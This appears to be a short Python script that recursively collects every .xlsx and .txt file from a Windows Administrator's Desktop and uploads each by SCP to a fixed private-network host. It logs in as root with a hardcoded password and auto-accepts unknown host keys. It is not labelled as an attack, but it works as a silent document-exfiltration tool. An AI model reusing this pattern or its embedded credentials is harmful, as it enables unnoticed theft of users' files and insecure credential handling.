import os,easygui,paramiko
from scp import SCPClient
def SCP(Ip,file):          #上传文件
    os.chdir("C:\\Users\\Administrator\\xiaoxue")
    ssh=paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    private_key=paramiko.RSAKey.from_private_key_file("id_rsa")
    ssh.connect(hostname="192.168.116.200",port=22,username='root',password="xiaoxue")
    scp=SCPClient(ssh.get_transport(),socket_timeout=15.0)
    scp.put(file, "/mnt/")
    ssh.close()
def search(dir,fil):
    os.chdir(dir)
    it = os.listdir()
    aww=[ ]
    for i in it:
        pa = os.path.join(dir,i)
        if os.path.isdir(pa):
            search(pa,fil)
            os.chdir(os.pardir)
        elif fil in pa.split("/")[-1] :
            b=repr(pa)
            SCP("192.168.116.200",pa)
search("C:\\Users\\Administrator\\Desktop","xlsx")
search("C:\\Users\\Administrator\\Desktop","txt")
    